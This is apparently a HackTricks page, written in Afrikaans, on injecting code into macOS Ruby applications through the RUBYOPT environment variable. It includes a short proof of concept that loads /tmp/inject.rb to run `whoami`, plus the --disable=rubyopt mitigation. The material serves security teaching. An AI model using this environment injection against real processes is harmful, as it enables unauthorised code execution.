# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Ruby ontleed ondersteunde command-line switches vanuit die `RUBYOPT`-omgewingsveranderlike voordat dit ’n script uitvoer. Hoewel Ruby sommige switches daar verwerp, kan `-I` ’n library-search directory vooraf plaas en `-r` kan ’n library require. ’n Proses wat Ruby met attacker-controlled environment variables begin, kan dus gedwing word om attacker-controlled Ruby code te laai.<sup>[[1]](#references)</sup>

Skep `/tmp/inject.rb`:
```ruby:inject.rb
puts `whoami`
```
Skep ’n onskadelike Ruby-script soos `hello.rb`:
```ruby:hello.rb
puts 'Hello, World!'
```
Voer dit uit met 'n beheerde `RUBYOPT`-waarde:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Om hierdie gedrag te deaktiveer, gee `--disable=rubyopt` (of `--disable-rubyopt`) **voor** die skripnaam deur:<sup>[[1]](#references)</sup>
```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```
'n Opsie wat ná `hello.rb` geskryf word, word in `ARGV` aan die script oorgedra; dit deaktiveer nie Ruby se vroeëre verwerking van `RUBYOPT` nie.<sup>[[1]](#references)</sup>

## References

- [1] [Ruby-dokumentasie - Ruby-opdragreëlopsies](https://ruby-doc.org/3.4/ruby/options_md.html)
{{#include ../../../banners/hacktricks-training.md}}
